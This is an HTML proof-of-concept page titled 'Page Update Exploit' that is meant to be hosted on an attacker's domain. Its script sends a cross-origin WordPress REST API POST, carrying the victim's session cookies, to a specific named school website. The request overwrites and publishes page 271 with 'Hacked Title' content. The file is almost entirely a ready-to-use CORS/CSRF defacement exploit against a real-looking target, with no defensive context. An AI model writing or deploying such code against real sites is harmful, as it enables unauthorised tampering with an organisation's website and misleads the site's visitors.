<!-- Save as cors-exploit.html and host it on your domain -->
<!DOCTYPE html>
<html>
<head>
  <title>Page Update Exploit</title>
</head>
<body>
  <h2>Click to Inject Page Content</h2>
  <button onclick="exploit()">Inject Page</button>
  <pre id="result" style="background:#eee;padding:10px;"></pre>

  <script>
    function exploit() {
      fetch('https://lahanparagon.edu.np/wp-json/wp/v2/pages/271', {
        method: 'POST',
        credentials: 'include', // send session cookies
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          title: 'Hacked Title',
          content: '<h1>Modified via External Host</h1>',
          status: 'publish'
        })
      })
      .then(res => res.json())
      .then(data => {
        document.getElementById('result').textContent = '✅ Success:\n' + JSON.stringify(data, null, 2);
      })
      .catch(err => {
        document.getElementById('result').textContent = '❌ Error:\n' + err.message;
      });
    }
  </script>
</body>
</html>
